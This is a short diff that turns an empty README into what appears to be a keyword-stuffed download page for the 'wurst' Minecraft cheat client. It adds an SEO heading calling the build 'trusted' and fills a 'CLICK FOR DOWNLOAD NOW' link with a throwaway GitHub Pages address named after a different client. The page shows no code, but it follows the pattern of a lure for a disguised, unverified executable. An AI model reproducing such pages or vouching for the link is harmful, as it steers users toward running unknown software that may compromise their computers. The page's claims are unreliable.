@@ -1,10 +1,10 @@
-
+# free download minecraft wurst client for Windows | trusted latest version minecraft wurst client. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://minecraft-raven-b4-cli-lw09.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
